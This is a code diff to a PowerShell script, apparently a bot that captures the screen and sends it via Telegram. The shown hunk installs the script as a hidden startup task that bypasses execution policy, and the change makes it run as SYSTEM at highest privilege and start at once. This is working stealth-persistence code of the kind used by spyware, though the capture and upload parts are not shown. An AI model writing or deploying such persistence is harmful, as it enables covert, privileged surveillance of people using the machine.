@@ -8,24 +8,39 @@ param(
 if (-not $background) {
     $taskName = "ScreenCaptureTelegramBot"
     try {
-        # Check if task already exists
         $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     }
-    catch { $existingTask = $null }
-
+    catch {
+        $existingTask = $null
+    }
+    
     if (-not $existingTask) {
-        # Get the full path to the current script
-        $scriptPath = $MyInvocation.MyCommand.Definition
+        # Determine the full script path
+        if ($PSCommandPath) {
+            $scriptPath = $PSCommandPath
+        }
+        else {
+            $scriptPath = $MyInvocation.MyCommand.Definition
+        }
 
         # Create the task action to run the script with the -background switch, hidden.
         $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
-        # Create a trigger to run the task at system startup
+        
+        # Create a trigger to run the task at startup
         $trigger = New-ScheduledTaskTrigger -AtStartup
-        # Register the scheduled task (requires appropriate permissions)
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
-        Write-Output "Scheduled task '$taskName' registered. It will run in the background at startup."
-        # Optionally, start the task immediately
-        Start-ScheduledTask -TaskName $taskName
+
+        # Create a principal to run as SYSTEM (this may require elevated privileges)
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+        try {
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
+            Write-Output "Scheduled task '$taskName' registered. It will run in the background at startup."
+            # Optionally, start the task immediately
+            Start-ScheduledTask -TaskName $taskName
+        }
+        catch {
+            Write-Error "Failed to register scheduled task: $_"
+        }
         exit
     }
 }
